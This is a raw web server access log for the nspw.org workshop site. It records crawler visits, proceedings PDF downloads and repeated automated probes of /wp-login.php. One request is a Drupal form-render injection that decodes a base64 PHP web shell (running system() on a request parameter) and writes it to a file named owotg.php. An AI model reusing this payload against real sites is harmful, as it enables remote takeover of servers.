216.244.66.236 - - [30/Apr/2018:14:52:58 -0400] "GET /2009/proceedings/1993/nspw1993-hosmer-2.pdf HTTP/1.1" 200 1353159 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
82.227.38.183 - - [30/Apr/2018:14:53:05 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.227.38.183 - - [30/Apr/2018:14:53:05 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
72.79.123.152 - - [30/Apr/2018:14:53:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
72.79.123.152 - - [30/Apr/2018:14:53:44 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:14:53:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
190.24.46.105 - - [30/Apr/2018:14:55:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.24.46.105 - - [30/Apr/2018:14:55:33 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:14:55:34 -0400] "GET /2009/proceedings/2008/nspw2008-julisch.pdf HTTP/1.1" 200 431730 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:14:56:50 -0400] "GET /papers/2000/nspw2000-templeton.pdf HTTP/1.1" 200 709129 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
191.177.185.191 - - [30/Apr/2018:14:57:07 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.177.185.191 - - [30/Apr/2018:14:57:08 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:14:58:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
80.8.148.183 - - [30/Apr/2018:15:00:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
80.8.148.183 - - [30/Apr/2018:15:00:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
107.21.1.8 - - [30/Apr/2018:15:00:43 -0400] "GET / HTTP/1.1" 200 6443 "https://www.nspw.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [30/Apr/2018:15:00:43 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.21.1.8 - - [30/Apr/2018:15:00:43 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
66.249.73.91 - - [30/Apr/2018:15:01:24 -0400] "GET /proceedings/2003 HTTP/1.1" 200 6127 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:15:01:20 -0400] "GET /2009/proceedings/2007/nspw2007-vidyaraman.pdf HTTP/1.1" 200 259353 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.142.219.255 - - [30/Apr/2018:15:02:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.142.219.255 - - [30/Apr/2018:15:02:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:15:01:35 -0400] "GET /2009/proceedings/2001/nspw2001-du.pdf HTTP/1.1" 200 911033 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:02:20 -0400] "GET /1999/cfp.pdf HTTP/1.1" 200 29990 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:03:16 -0400] "GET /papers/1999/?C=N;O=A HTTP/1.1" 200 4386 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:03:20 -0400] "GET /2009/proceedings/1999/?C=D;O=A HTTP/1.1" 200 970 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.113 - - [30/Apr/2018:15:03:18 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712499 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [30/Apr/2018:15:03:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:15:04:04 -0400] "GET /node/33 HTTP/1.1" 200 6951 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:04:06 -0400] "GET /2009/proceedings/2006/nspw2006-gutmann.pdf HTTP/1.1" 200 100046 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.67 - - [30/Apr/2018:15:04:39 -0400] "GET /papers/2012/ HTTP/1.1" 200 6357 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:04:52 -0400] "GET /2002/past.content HTTP/1.1" 200 5126 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:05:24 -0400] "GET /node/26 HTTP/1.1" 200 6158 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:15:05:57 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.6 - - [30/Apr/2018:15:06:00 -0400] "GET /papers/1995/ HTTP/1.1" 200 4381 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [30/Apr/2018:15:06:26 -0400] "GET /2009/index.shtml HTTP/1.1" 200 5410 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:07:14 -0400] "GET /papers/1999/nspw1999-markham.pdf HTTP/1.1" 200 447590 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.200 - - [30/Apr/2018:15:08:30 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [30/Apr/2018:15:08:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:15:09:22 -0400] "GET /2009/proceedings/2006/?C=N;O=D HTTP/1.1" 200 4323 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
177.38.194.4 - - [30/Apr/2018:15:10:02 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.38.194.4 - - [30/Apr/2018:15:10:03 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:15:10:32 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666930 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.74.215.89 - - [30/Apr/2018:15:11:02 -0400] "GET / HTTP/1.1" 200 6578 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:11:02 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27822 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:11:02 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1477 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:11:02 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7471 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
185.51.75.169 - - [30/Apr/2018:15:12:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.51.75.169 - - [30/Apr/2018:15:12:22 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
212.34.240.30 - - [30/Apr/2018:15:13:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
212.34.240.30 - - [30/Apr/2018:15:13:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:15:13:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
64.74.215.89 - - [30/Apr/2018:15:14:25 -0400] "GET / HTTP/1.1" 200 6578 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:14:26 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27822 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:14:26 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1477 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
64.74.215.89 - - [30/Apr/2018:15:14:26 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7471 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
66.249.73.89 - - [30/Apr/2018:15:15:05 -0400] "GET /papers/2001/nspw2001-sekar.pdf HTTP/1.1" 200 760475 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
86.126.114.160 - - [30/Apr/2018:15:16:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.126.114.160 - - [30/Apr/2018:15:16:16 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.113 - - [30/Apr/2018:15:17:36 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 200 1020137 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [30/Apr/2018:15:18:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:15:19:37 -0400] "GET /papers/2007/nspw2007-edwards.pdf HTTP/1.1" 200 345377 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
210.195.252.82 - - [30/Apr/2018:15:20:35 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
210.195.252.82 - - [30/Apr/2018:15:20:36 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.16.157.183 - - [30/Apr/2018:15:21:09 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [30/Apr/2018:15:23:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:15:24:11 -0400] "GET /2001/local.html HTTP/1.1" 200 5126 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
139.162.113.204 - - [30/Apr/2018:15:24:42 -0400] "GET / HTTP/1.1" 200 11394 "-" "Go-http-client/1.1"
86.24.140.177 - - [30/Apr/2018:15:26:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.24.140.177 - - [30/Apr/2018:15:26:38 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
146.199.40.47 - - [30/Apr/2018:15:27:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
146.199.40.47 - - [30/Apr/2018:15:27:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.176.194.232 - - [30/Apr/2018:15:28:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:15:28:44 -0400] "GET /2004/papers.shtml HTTP/1.1" 200 5775 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.176.194.232 - - [30/Apr/2018:15:28:45 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:15:28:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
84.111.188.75 - - [30/Apr/2018:15:28:49 -0400] "GET /wp-login.php HTTP/1.1" 404 8034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
84.111.188.75 - - [30/Apr/2018:15:28:49 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:15:32:08 -0400] "GET /current/oc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [30/Apr/2018:15:33:18 -0400] "GET /cfp/flyer_NSPW_2013.pdf HTTP/1.1" 200 95505 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:15:33:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:15:33:45 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:33:49 -0400] "GET /2008/?C=S;O=A HTTP/1.1" 200 2144 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:33:59 -0400] "GET /2009/proceedings/2007/?C=S;O=A HTTP/1.1" 200 4365 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:34:29 -0400] "GET /papers/1994/nspw1994-bertino.pdf HTTP/1.1" 200 542108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:35:28 -0400] "GET /1999/dates.html HTTP/1.1" 200 5061 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.113 - - [30/Apr/2018:15:35:16 -0400] "GET /papers/2002/nspw2002-capkun.pdf HTTP/1.1" 200 622994 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:15:35:56 -0400] "GET /proceedings/2008 HTTP/1.1" 200 6934 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:37:51 -0400] "GET /node/53 HTTP/1.1" 200 6952 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [30/Apr/2018:15:37:52 -0400] "GET /2004/program.html HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:15:38:08 -0400] "GET /2008/?C=D;O=A HTTP/1.1" 200 5567 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:15:38:29 -0400] "GET /2009/proceedings/1998/nspw1998-kahn.pdf HTTP/1.1" 200 1162793 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:15:38:44 -0400] "GET /papers/2007/?C=S;O=D HTTP/1.1" 200 4358 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:15:38:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.157 - - [30/Apr/2018:15:38:45 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587366 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.18 - - [30/Apr/2018:15:39:45 -0400] "GET /papers/2013/nspw2013-bishop.pdf HTTP/1.1" 200 509717 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
137.112.228.195 - - [30/Apr/2018:15:39:46 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [30/Apr/2018:15:39:46 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:46 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [30/Apr/2018:15:39:47 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
66.102.6.201 - - [30/Apr/2018:15:39:57 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
77.88.47.40 - - [30/Apr/2018:15:40:02 -0400] "GET /2009/dates.shtml HTTP/1.1" 200 5089 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:40:05 -0400] "GET /node/89 HTTP/1.1" 200 4052 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:15:40:07 -0400] "GET /current/pc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.255.250.67 - - [30/Apr/2018:15:40:30 -0400] "GET / HTTP/1.1" 200 6635 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.157 - - [30/Apr/2018:15:40:45 -0400] "GET /papers/2003/?C=M;O=D HTTP/1.1" 200 7257 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
125.163.145.6 - - [30/Apr/2018:15:41:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.136 - - [30/Apr/2018:15:41:45 -0400] "GET /papers/2005/nspw2005-flechais.pdf HTTP/1.1" 200 1942302 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
125.163.145.6 - - [30/Apr/2018:15:41:48 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:15:42:25 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 200 610901 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.19 - - [30/Apr/2018:15:42:45 -0400] "GET /proceedings/2008 HTTP/1.1" 200 14227 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [30/Apr/2018:15:42:59 -0400] "GET /2009/proceedings/2013/nspw2013-castro.pdf HTTP/1.1" 200 347010 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
59.124.153.166 - - [30/Apr/2018:15:43:03 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
180.76.15.135 - - [30/Apr/2018:15:43:45 -0400] "GET /2009/proceedings/2009/?C=S;O=A HTTP/1.1" 200 7065 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [30/Apr/2018:15:43:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
5.255.250.67 - - [30/Apr/2018:15:44:09 -0400] "GET /2007/cfp/ HTTP/1.1" 403 3965 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.204 - - [30/Apr/2018:15:43:53 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 512725 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.14 - - [30/Apr/2018:15:44:45 -0400] "GET /papers/2006/nspw2006-locasto.pdf HTTP/1.1" 200 166235 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
86.137.107.202 - - [30/Apr/2018:15:45:42 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 561817 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
